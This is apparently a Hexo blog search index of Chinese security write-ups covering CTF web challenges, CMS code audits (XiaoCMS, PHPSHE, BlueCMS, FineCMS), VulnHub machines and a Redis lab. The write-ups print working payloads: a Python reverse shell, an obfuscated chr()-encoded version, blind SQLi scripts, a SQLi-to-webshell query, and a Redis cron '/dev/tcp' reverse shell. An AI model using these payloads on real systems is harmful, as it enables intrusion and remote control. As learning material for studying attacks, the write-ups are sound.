<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Inctf&HackoverCTF Web部分题目解析]]></title>
    <url>%2F2018%2F10%2F09%2FInctf-HackoverCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Hackover CTF与InCTF部分Web题目解析 Hackover CTFwho knows john dows? Description Howdy mate! Just login and hand out the flag, aye! You can find on h18johndoe has all you need! http://yo-know-john-dow.ctf.hackover.de:4567/login alternative: 46.101.157.142:4567/login 题目给的链接中有一个是GitHub地址，在里面有源码存在 1234567891011121314151617181920212223242526272829class UserRepo def initialize(database) @database = database @users = database[:users] end def login(identification, password) hashed_input_password = hash(password) query = "select id, phone, email from users where email = '#&#123;identification&#125;' and password_digest = '#&#123;hashed_input_password&#125;' limit 1" puts "SQL executing: '#&#123;query&#125;'" @database[query].first if user_exists?(identification) end def user_exists?(identification) !get_user_by_identification(identification).nil? end private def get_user_by_identification(identification) @users.where(phone: identification).or(email: identification).first end def hash(password) password.reverse endend 显而易见的存在有SQL注入漏洞，其中的hash加密密码更是只把密码反转了下，所以只要构造 1password=' or 1=1 limit 1# 然后反转一下就可以了 看下Web界面 需要找到一个邮箱 从GitHub下手，把仓库clone到本地后，查看下日志 经过尝试最后`john_doe@notes.h18`登陆成功 最后尝试注入的时候居然出现了500错误，修改payload为 1password=' or 1=1 limit 1;# 反转后输入密码，成功得到flag InCTFS3cur3 BankDescription 12345678S3cur3 Bank 179======= Difficulty level : Medium ========It is notoriously called the most secure bank service ever. It allows us to transfer your money between 2 accounts. Can you hack the service to buy a flag???Link(http://18.188.42.158/)========== Authors : c3rb3ru5, SpyD3r ========== 题目给了两个账号，相互之间可以互相转账，只有5000金币才可以买到flag，而我们两个银行加起来才2000，这样的题一般情况下就是在执行一项操作时并不会进行锁定，就相当于饭卡里有一百块钱，同时在两台机器上刷都显示100，全部花完后饭卡里没钱了，而我们一共得到了200块钱的食物。 利用脚本一枚 12345678910111213141516171819import requestsimport threadingurl = "http://18.188.42.158/bank.php?id=dc90a0a10c79e341f5b521da39dbc585"def make_money(): data = &#123;"transfer": 1000, "account": "Transfer to B"&#125; response = requests.post(url,data=data) print(response.text)try: t1 = threading.Thread(target=make_money, args=[]) t2 = threading.Thread(target=make_money, args=[]) t1.start() t2.start()except: print("Error: unable to start thread") 其中的transfer在每次成功后都要改，account在每次运行后都要更改，并不会每次都成功。 最后可以终于买到flag了~~ The Most Secure File UploaderDescription Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you…You don’t look like a hacker at all…Can you fix this for me? :) http://18.216.190.57/ Challenge Difficulty Level:Medium Web界面一个上传点儿就这么放在了眼前 看到上传界面先上传了个txt 嗯，只能上传图片文件的话我再来一个png文件 还是报错 不过这个报错提示有点儿熟悉，好像是python一样，索性把图片平改成1#.png试一下(#在python中是注释的意思 页面返回正常 试下print 好的！接下来用python写个反弹shell吧 1exec(import socket, subprocess;s = socket.socket();s.connect(('ip',端口))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())) 在自己服务器上打开监听，不想却有黑名单存在,不过exec没在黑名单里 利用Ascii编码绕过黑名单具体做法是把payload改为 1exec(''.join([chr(105),chr(109),chr(112),chr(111),chr(114),chr(116),chr(32),chr(115),chr(111),chr(99),chr(107),chr(101),chr(116),chr(44),chr(32),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(59),chr(115),chr(32),chr(61),chr(32),chr(115),chr(111),chr(99),chr(107),chr(101),chr(116),chr(46),chr(115),chr(111),chr(99),chr(107),chr(101),chr(116),chr(40),chr(41),chr(59),chr(115),chr(46),chr(99),chr(111),chr(110),chr(110),chr(101),chr(99),chr(116),chr(40),chr(40),chr(39),chr(105),chr(112),chr(39),chr(44),chr(50),chr(51),chr(51),chr(51),chr(41),chr(41),chr(10),chr(119),chr(104),chr(105),chr(108),chr(101),chr(32),chr(49),chr(58),chr(32),chr(32),chr(112),chr(114),chr(111),chr(99),chr(32),chr(61),chr(32),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(111),chr(112),chr(101),chr(110),chr(40),chr(115),chr(46),chr(114),chr(101),chr(99),chr(118),chr(40),chr(49),chr(48),chr(50),chr(52),chr(41),chr(44),chr(32),chr(115),chr(104),chr(101),chr(108),chr(108),chr(61),chr(84),chr(114),chr(117),chr(101),chr(44),chr(32),chr(115),chr(116),chr(100),chr(111),chr(117),chr(116),chr(61),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(73),chr(80),chr(69),chr(44),chr(32),chr(115),chr(116),chr(100),chr(101),chr(114),chr(114),chr(61),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(73),chr(80),chr(69),chr(44),chr(32),chr(115),chr(116),chr(100),chr(105),chr(110),chr(61),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(73),chr(80),chr(69),chr(41),chr(59),chr(115),chr(46),chr(115),chr(101),chr(110),chr(100),chr(40),chr(112),chr(114),chr(111),chr(99),chr(46),chr(115),chr(116),chr(100),chr(111),chr(117),chr(116),chr(46),chr(114),chr(101),chr(97),chr(100),chr(40),chr(41),chr(43),chr(112),chr(114),chr(111),chr(99),chr(46),chr(115),chr(116),chr(100),chr(101),chr(114),chr(114),chr(46),chr(114),chr(101),chr(97),chr(100),chr(40),chr(41),chr(41)])) 拿到反弹的Sehll找到flag 使用globals()函数调用内置函数先来看下globals()的定义 返回全局变量的字典。 就是这些东东 其中第一项里包含了python的内置函数，可以通过globals().values()[0].__dict__查看 import也是python内置函数，可以通过globals().values()[0].__dict__[&#39;__import__&#39;](模块名).function()调用指定函数,例如导入os.listdir()函数 回到题目，本来也可以通过globals()调用os.listdir但是os被禁了，只好采用另一种方式 1globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).listdir('./') 将被禁的字符转化为base64，成功绕过 最后就是利用内置函数open来打开flag文件啦 GoSQL开始前先来几个MySQL的一些知识 1.字符集为utf-8的情况下 1234Ä = A Ö = O Ü = U à = a 上述等式是成立的 也就是说 1àdmin = admin 2.MySQL中 /*select * from users*/表示注释/**/内的语句并不会执行，但是/*!select * from users*/确实可以执行的 3.sleep可以代替if充当判断的角色 当条件为真时 条件为假时 4.可以等效替换的一些关键词 1234where : havingsubstr : insert&lt;space&gt; : %0a = : in 进入题目 12345678910111213141516171819202122232425262728293031323334353637383940query: select * from inctf2018_chall_2 /**/ username=''Having a query problem&lt;?phpinclude("./config.php");$conn = mysqli_connect($host,$dbuser,$dbpass,$dbname);if (!$conn) &#123; die("Connection failed: " . mysqli_connect_error());&#125;mysqli_set_charset($conn,"utf8");$name = $_GET['name'];$clause = $_GET['clause'];$blacklist = "pad|admin|'|\"|substr|mid|concat|char|ascii|left|right|for| |from|where|having";$blacklist .= "insert|username|\/|-|go_to|\||or|and|\\\|=|#|\.|\_|like|between|reg|&amp;|load|file|glob|cast|out|0";$blacklist .= "user|rev|0x|limit|conv|hex|from|innodb|\^|union|benchmark|if|case|coalesce|max|strcmp|proc|group|rand|floor|pow";if (preg_match("/$blacklist/i", $name))&#123; die("Try Hard");&#125;if(preg_match("/$blacklist/i", $clause))&#123; die("You don't need it!!!");&#125;$query="select * from inctf2018_chall_2 /*". $clause . "*/ username='" . $name . "'";echo "&lt;h4&gt;query: " . $query . " &lt;/h4&gt;";$result=mysqli_query($conn,$query);if($result)&#123; $row=mysqli_fetch_array($result); if($row['username']=="admin")&#123; header("Location:&#123;$row['go_to']&#125;");&#125; else&#123; echo "&lt;h4&gt;You are not admin" . "&lt;/h4&gt;"; &#125;&#125;else&#123; echo "&lt;h4&gt;Having a query problem" . "&lt;/h4&gt;&lt;br&gt;";&#125;highlight_file(__FILE__);?&gt; 可以看到其设置了黑名单，但是 having insert 0 user sleep却没有在黑名单里，其中前四个都是因为拼接的时候没加|导致的，这点儿后面会用到 这一步用前两点构造payload clause=!having&amp;name=àdmin 进入下一个场景 自然想到SSRF 尝试了file|ftp好像都被过滤了，最后试了下Gopher，没被过滤，那么现在就需要数据库账号了，刚好利用前面的having与insert 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsfrom time import timeurl="http://18.219.221.225/?clause="user_name=""len_user=20'''for i in range(1,50): query=url + "!having%0asleep(((select%0alength(user()))%0ain%0a(select%0a0b" + "&#123;:b&#125;".format(i) + "))*3);%00" start = time() req=requests.get(query) end=time() if((end-start)&gt;=2): len_user=i break print (i)'''print("Got the user length : " + str(len_user))flag=""def iterate(): temp="" for i in range(0,len(flag),2): temp+="&#123;:b&#125;".format(int(flag[i:i+2])).rjust(8,"0") return tempfor j in range(1,len_user+1): for i in range(64,122): query=url + "!having%0asleep(((select%0ainsert(user()," + str(j+1) + ",255,space(0)))%0ain%0a(select%0a0b" + iterate() + "&#123;:b&#125;".format(i).rjust(8,"0") + "))*3);%00" print(query) if i == 65: exit() start=time() req=requests.get(query) end=time() if((end-start)&gt;=2): flag+=str(i) user_name +=chr(i) break print(i)print ("Got the user name: " + user_name) 得到username:INCTF_SSRF 之后利用了这款工具:https://github.com/tarunkant/Gopherus 构造payload后查看用户读写权限 应该可以读写的，尝试下读取/etc/mysql/mysql.conf.d/mysqld.cnf这是MySQL的配置文件，可以看到能够写入文件到哪里 看出来给了提示/tmp_is_great 于是写shell到/tmp_is_great,最后测试下shell 最后只要cat 一下flag文件就可以啦]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XiaoCMS漏洞分析]]></title>
    <url>%2F2018%2F10%2F06%2FXiaoCMS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[继续进行代码审计，本次选择的是XiaoCMS 0x01 简单分析这个CMS采用的MVC模式，先看下入口文件 index.php 12345678&lt;?php/** * XiaoCms企业建站版 * 官方网站:http://www.xiaocms.com */define('XIAOCMS_PATH', dirname(__FILE__) . DIRECTORY_SEPARATOR);include XIAOCMS_PATH . 'core/xiaocms.php';xiaocms::run(); 包含了xiaocms.php 有一个安全处理函数,将’/‘和’.’替换为’’ 123private static function _safe($str) &#123; return str_replace(array('/', '.'), '', $str);&#125; 还有一个读取文件的函数，不过用在了加载控制器中了，也没什么用 进入Base.class.php 重新定义了GET和POST方法 1234567891011121314public static function get($string) &#123; if (!isset($_GET[$string])) return null; if (!is_array($_GET[$string])) return htmlspecialchars(trim($_GET[$string])); return null; &#125; public static function post($string) &#123; if (!isset($_POST[$string])) return null; if (!is_array($_POST[$string])) return htmlspecialchars(trim($_POST[$string])); $postArray = self::array_map_htmlspecialchars($_POST[$string]); return $postArray; &#125; htmlspecialchars会将&lt;&gt;和双引号过滤 0x02 后台任意文件上传看到有upload.class.php，进去看下,有个upload函数 12345678public function upload($file_upload, $file_name) &#123; if (!is_array($file_upload) || empty($file_name)) return false; $this-&gt;parse_init($file_upload); if (!@move_uploaded_file($this-&gt;file_name['tmp_name'], $file_name)) return '文件上传失败，请检查服务器目录权限'; return true; &#125; 跟进parse_init函数 123456789101112131415protected function parse_init($file) &#123; $this-&gt;file_name = $file; if ($this-&gt;file_name['size'] &gt; $this-&gt;limit_size) &#123; echo '您上传的文件:' . $this-&gt;file_name['name'] . ' 大小超出上传限制!'; exit(); &#125; if ($this-&gt;limit_type) &#123; if (!in_array($this-&gt;get_file_ext(), $this-&gt;limit_type)) &#123; echo '您上传的:' . $this-&gt;file_name['name'] . ' 文件格式不正确!'; exit(); &#125; &#125; return true; &#125; $this-&gt;limit_type通过set_limit_type函数获取，搜索set_limit_type 在admin/controller/uploadfile.php中发现upload函数 1234567private function upload($fields, $type, $size) &#123; $upload = xiaocms::load_class('upload'); $ext = strtolower(substr(strrchr($_FILES[$fields]['name'], '.'), 1));………… $result = $upload-&gt;set_limit_size(1024*1024*$size)-&gt;set_limit_type($type)-&gt;upload($_FILES[$fields],XIAOCMS_PATH.$filenpath);…… 同样在admin/controller/uploadfile.php中发现uploadify_uploadAction函数 1234567891011/![10](D:\hexo\source\_posts\XiaoCMS漏洞分析\10.png)** * uploadify_upload */ public function uploadify_uploadAction() &#123; $type = $this-&gt;get('type'); $size = (int)$this-&gt;get('size'); if ($this-&gt;post('submit')) &#123; $data = $this-&gt;upload('file', explode(',', $type), $size); if ($data['result']) echo $data['path']; &#125; &#125; $this-&gt;limit_type与$this-&gt;limit_size都可以控制了，接下来构造upload.html 上传shell 0x03 后台模板写shell漏洞位于admin/controller/template.php editAction函数 123456789public function editAction() &#123; …… if ($this-&gt;post('submit')) &#123; file_put_contents($filepath, htmlspecialchars_decode($this-&gt;post('file_content')), LOCK_EX); $this-&gt;show_message('提交成功',1); &#125; $filecontent = htmlspecialchars(file_get_contents($filepath)); include $this-&gt;admin_tpl('template_add'); &#125; 前面提到过get post到的内容都被htmlspecialchars转义了，而这里又用htmlspecialchars_decode反转义了 0x04 总结htmlspecialchars和MySQL PDO是真的难受……]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPSHE1.5漏洞分析]]></title>
    <url>%2F2018%2F10%2F05%2FPHPSHE1-5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[PHPSHE1.5后台存在大量SQL注入漏洞，以及一些其他漏洞，这次就找一些来进行分析 0x01 后台登陆逻辑漏洞漏洞描述后台登陆处无视验证码，可以进行爆破 漏洞利用密码输入错误时跳转到登陆界面 密码输入正确跳转的链接 可以根据返回内容不同进行爆破找到密码 漏洞分析代码位于/module/admin/do.php 123456789101112131415161718if (isset($_p_pesubmit)) &#123; $sql_set['admin_name'] = $_p_admin_name; $sql_set['admin_pw'] = md5($_p_admin_pw); if ($info = $db-&gt;pe_select('admin', pe_dbhold($sql_set))) &#123; strtolower($_s_authcode) != strtolower($_p_authcode) &amp;&amp; pe_error('验证码错误...'); $db-&gt;pe_update('admin', array('admin_id'=&gt;$info['admin_id']), array('admin_ltime'=&gt;time())); $_SESSION['admin_idtoken'] = md5($info['admin_id'].$pe['host_root']); $_SESSION['admin_id'] = $info['admin_id']; $_SESSION['admin_name'] = $info['admin_name']; $_SESSION['pe_token'] = pe_token_set($_SESSION['admin_idtoken']); pe_success('登录成功！', 'admin.php'); &#125; else &#123; pe_error('用户名或密码错误...'); &#125; &#125; $seo = pe_seo('管理员登录', '', '', 'admin'); include(pe_tpl('do_login.html')); 可以看到，这个登陆逻辑是先判断账号密码是否正确，之后再判断验证码是否正确 0x02 后台SQL注入漏洞描述在传递某些参数时未经过过滤，导致SQL注入 漏洞利用0x01 admin.php?mod=user1http://localhost/phpshe1.5/admin.php?mod=user&amp;name=%27%20union%20select%20user(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23 可以看到，注入成功，并且爆出了绝对路径 写入一句话 1http://localhost/phpshe1.5/admin.php?mod=user&amp;name=%27%20union%20select%20'&lt;?php @eval($_POST[a])?&gt;',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile "D:\\wamp64\\www\\phpshe1.5\\shell.php"%23 可以看到一句话已经写入 使用菜刀连接 0x02 admin.php?mod=user&amp;act=email1http://localhost/phpshe1.5/admin.php?mod=user&amp;act=email&amp;id=1') union select * from ((select user())A join (select user())b join (select user())c join (select user())d join (select user())e join (select user())f join (select user())g join (select user())h join (select user())i join (select user())j join (select user())k join (select user())l join (select user())m join (select user())n join (select user())o join (select user())p join (select user())q join (select user())r )# 利用成功 除了payload不一样外其余操作与上一个漏洞基本一样 漏洞分析0x01代码位于/module/admin/user.php 1234567891011121314151617$_g_name &amp;&amp; $sqlwhere .= " and `user_name` like '%&#123;$_g_name&#125;%'"; $_g_phone &amp;&amp; $sqlwhere .= " and `user_phone` like '%&#123;$_g_phone&#125;%'"; $_g_email &amp;&amp; $sqlwhere .= " and `user_email` like '%&#123;$_g_email&#125;%'"; if (in_array($_g_orderby, array('ltime|desc', 'point|desc', 'ordernum|desc'))) &#123; $orderby = explode('|', $_g_orderby); $sqlwhere .= " order by `user_&#123;$orderby[0]&#125;` &#123;$orderby[1]&#125;"; &#125; else &#123; $sqlwhere .= " order by `user_id` desc"; &#125; $info_list = $db-&gt;pe_selectall('user', $sqlwhere, '*', array(20, $_g_page)); $tongji['user'] = $db-&gt;pe_num('user'); $tongji['useraddr'] = $db-&gt;pe_num('useraddr'); $tongji['userbank'] = $db-&gt;pe_num('userbank'); $seo = pe_seo($menutitle='会员列表', '', '', 'admin'); include(pe_tpl('user_list.html')); $_g_name是定义在common.php文件中 12345678if (get_magic_quotes_gpc()) &#123; !empty($_GET) &amp;&amp; extract(pe_trim(pe_stripslashes($_GET)), EXTR_PREFIX_ALL, '_g'); !empty($_POST) &amp;&amp; extract(pe_trim(pe_stripslashes($_POST)), EXTR_PREFIX_ALL, '_p');&#125;else &#123; !empty($_GET) &amp;&amp; extract(pe_trim($_GET),EXTR_PREFIX_ALL,'_g'); !empty($_POST) &amp;&amp; extract(pe_trim($_POST),EXTR_PREFIX_ALL,'_p');&#125; extract将GET与POST的参数加上_g_并成为变量,并未做防范sql注入的过滤 所以构造payload： 1mod=user&amp;name=%27%20union%20select%20user(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23 即可 0x02代码同样位于/module/admin/user.php 12345678910111213141516171819202122232425262728case 'email': if (isset($_p_pesubmit)) &#123; pe_token_match(); !$_p_email_user &amp;&amp; pe_error('收件人必须填写...'); !$_p_email_name &amp;&amp; pe_error('邮件标题必须填写...'); !$_p_email_text &amp;&amp; pe_error('邮件内容必须填写...'); $email_user = explode(',', $_p_email_user); foreach ($email_user as $k=&gt;$v) &#123; if (!$v) continue; $noticelog_list[$k]['noticelog_user'] = pe_dbhold($v); $noticelog_list[$k]['noticelog_name'] = pe_dbhold($_p_email_name); $noticelog_list[$k]['noticelog_text'] = $_p_email_text; $noticelog_list[$k]['noticelog_atime'] = time(); &#125; if ($db-&gt;pe_insert('noticelog', $noticelog_list)) &#123; pe_success('发送成功!', '', 'dialog'); &#125; else &#123; pe_error('发送失败...'); &#125; &#125; $info_list = $db-&gt;pe_selectall('user', array('user_id'=&gt;explode(',', $_g_id))); $email_user = array(); foreach ($info_list as $v) &#123; $v['user_email'] &amp;&amp; $email_user[] = $v['user_email']; &#125; $seo = pe_seo($menutitle='发送邮件', '', '', 'admin'); include(pe_tpl('user_email.html')); 其中 1$info_list = $db-&gt;pe_selectall('user', array('user_id'=&gt;explode(',', $_g_id))); 的$_g_id直接GET到后未进行过滤，不过有一个explode函数使得union select不太好使了，恰巧有个不用逗号的方法 1union select * from ((select user())A join (select user())b join (select user())c) 附上一段构造payload的python代码 123456789101112131415#coding=utf-8#union select * from ((select 1)A join (select 2)B join (select 3)C);#Max length 26import stringdic = string.ascii_lettersdef print_payload(col_length,content): payload = "union select * from ((select &#123;0&#125;)A ".format(content) for i in range(col_length-1): payload += "join (select &#123;0&#125;)&#123;1&#125; ".format(content,dic[i+1]) payload += ")" print(payload)print_payload(18,"user()") 0x03 总结果然爆破才是最强的]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VulnHub-LazySysAdmin]]></title>
    <url>%2F2018%2F10%2F05%2FVulnHub-LazySysAdmin%2F</url>
    <content type="text"><![CDATA[主要考察信息收集 0x01 前期试探使用nmap进行扫描,发现存在如下端口 可以做出简单的分析 端口 作用 22 SSH登陆 80 Web应用 445 共享文件 3306 MySql 使用御剑扫描下Web应用存在PHPMyAdmin与WordPress，和robots.txt文件robots.txt访问后发现没有多大用处,phpmyadmin与wordpress没有账号密码也并不好突破，不过在wordpress处获得了一个可能的账号togie 0x02 突破点Find因为其开放了445端口，所以用enum4linux尝试进行扫描可以看到share是OK的 windows下获取共享资源1net use k: \\10.10.10.132\share$ linux下获取共享资源1mount -t cifs -o username='',password='' //10.10.10.132/share$ /mnt 对得到文件进行查看在deets.txt文件中发现一个密码 再加上刚开始得到的一个可能的账号，首先尝试了下ssh连接没想到直接成功了,切换到root账户，完成 0x03 Web渗透0x01 WebShell这样就直接拿到Shell了？多少有些无趣，看了下wordpress的config文件找到了数据库的账号和密码记得刚才扫的有phpmyadmin目录，登陆成功，不过权限太低了，只好放弃尝试下登陆wordpress,没想到还是数据库的账号密码登陆上去了在404界面写入反弹shell得到WebShell 0x02 提权开坑待填…… 0x04 总结总的来说是一个比较简单的challange,基本上只要掌握了enum4linux以及获取共享资源的方法就可以，继续加油。]]></content>
      <categories>
        <category>Challenge</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vulnhub JJS-CTF]]></title>
    <url>%2F2018%2F10%2F05%2FVulnhub-JJS-CTF%2F</url>
    <content type="text"><![CDATA[Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags. 这个靶机中存在五个flag,平均1.5小时就可以找到它们。 0x00 主机发现使用Nmap进行扫描 1nmap -sS 192.168.1.0/24 发现目标机，并且其开放了22，与80端口 0x01 Web发现网站存在robots.txt文件 一番测试后发现只有admin_area页面和flag页面有内容，其他的也只有uploaded_files目录可以访问 admin_area flag 拿到第一个flag 扫目录发现flag.txt是forbidden，先不管它，其它的也没有什么发现，又回到了admin_area界面，怎么看都感觉是掩耳盗铃一般，查看源代码， 果真有收获。 第二个flag与账号密码就拿到手了 登陆后是一个上传界面，随便上传个一句话，居然成功了 0x02 Linux拿菜刀连接一下，连接成功 在HTML目录下有一个hint文件 得到第三个flag的同时有了下一个flag的线索，找到technawi用户的密码 使用命令 1find / -user 'technawi' 2&gt;/dev/null 找到所有属于technawi，且当前用户拥有权限的文件 众多文件中数这个credentials.txt最可疑 cat打开 第四个flag，以及technawi账户的密码就拿到手了，剩下的一个flag估计就在网站根目录下的flag.txt下了 前期端口扫描的时候知道了该主机存在SSH，所以用xshell连接，账号密码就是上面的，连接后 1cat /var/www/html/flag.txt 完工 0x03 总结这一个算是比较简单的题目，整个做下来基本上很流畅，Linux上的命令还不太熟悉，以后要多加练习。]]></content>
      <categories>
        <category>Challenge</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BlueCMS 代码审计]]></title>
    <url>%2F2018%2F10%2F03%2FBlueCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[blueCMS是一款小众的CMS ,网上也有很多漏洞分析之类的文章，用来做代码审计入门练习还是不错的选择 0x00 环境准备 Apache + PHP BlueCMS v1.6 sp1 Mysql监控 0x01大体结构分析入口文件与common函数大致看了下index文件，果然入口文件很难发现漏洞，继续看两个common文件 因为是GBK编码的CMS所以此处可以被宽字节注入，此外就是IP未过滤 0x02 漏洞点测试IP首先测试下IP，全局搜索getip,在comment发现getip并且未做处理就放入SQL中执行 进入comment页面，不知道为什么没有内容显示，只好换个方向，在common.inc文件中$online_ip是由getip得到的 搜索$online_ip后在guest_book文件中发现 测试下功能，确认可用 构造payload X-Forwarded-For:’,database())# 可以在留言中看到数据库名已经出现了 数值型注入在ad_js.php文件中可以发现，$ad_id变量受我们控制，而且插入SQL语句时没用单引号，这就使我们可以直接注入了 union select得到数据库名称 xss漏洞在user.php文件的增加新闻处 content并没有用htmlspecialchars函数过滤，而是采用了filter_data函数 只要关键字大写就可以绕过 创建一个用户后发表一个新闻，content内容为XSS PAYLOAD 切换账号访问新闻页 0x03 总结第一次代码审计一个CMS，果然我还是太菜了，只能发现最基础的一些漏洞，不过慢慢来啦，急不来。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[finecms免费版漏洞分析]]></title>
    <url>%2F2018%2F10%2F03%2Ffinecms%E5%85%8D%E8%B4%B9%E7%89%88%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[FineCMS是一款基于PHP+MySql+CI框架开发的高效简洁的中小型内容管理系统 0x00 开始前的准备网上存在许多5.0.X的漏洞分析，本来想找个5.0.x版本的进行分析，结果最后只找到了一个免费版 0x01 寻找漏洞在\extensions\下的function.php文件下有一个函数 其中的 1@eval("\$array = $data;"); 很明显存在漏洞，先测试下 Payload:?a=array();phpinfo() 0x02 漏洞利用回到CMS中，找一下哪里用了这个函数，在function.php文件里发现了一个fn_authcode函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * authcode函数(用于数组) */function fn_authcode($data, $operation = 'DECODE', $key = '', $expiry = 0) &#123; $ckey_length = 4; $string = $operation == 'DECODE' ? $data : array2string($data); $key = md5($key ? $key : SITE_MEMBER_COOKIE); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) &#123; $rndkey[$i] = ord($cryptkey[$i % $key_length]); &#125; for($j = $i = 0; $i &lt; 256; $i++) &#123; $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; &#125; for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123; $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); &#125; if($operation == 'DECODE') &#123; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123; return string2array(substr($result, 26)); &#125; else &#123; return ''; &#125; &#125; else &#123; return $keyc . str_replace('=', '', base64_encode($result)); &#125;&#125; 发现这个函数在ApiController.php文件中被调用 1$data = fn_authcode(base64_decode($this-&gt;get('file')), 'DECODE'); 这里的file可控，现在只要构造合适的file就可以达成命令执行了,回到fn_authocode函数，这是一个只和SITE_MEMBER_COOKIE有关的函数，而SITE_MEMBER_COOKIE又是一个默认的值，只要将fn_authcode的参数改一下就可以构造成我们要的payload 尝试下 1http://localhost/finecms/?c=api&amp;a=down&amp;file=ZmZlMXhvY3N4ZWluZnpuSEoyUGRBRkhPZ01rcGRQbFdLZ1RJT3pSaG0rR21ab1JyRS96c1dnMnFJT1dTMUVn 0x03 总结这一次漏洞分析还是异常吃力，漏洞函数很容易就发现了，但是漏洞利用的地方找了半天，除此之外就是fn_authocode函数的加解密，长见识了，对网站的整体结构了解还是不够，继续努力。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis未授权访问]]></title>
    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vulnhub FristiLeaks]]></title>
    <url>%2F2018%2F10%2F02%2FVulnhub-FristiLeaks%2F</url>
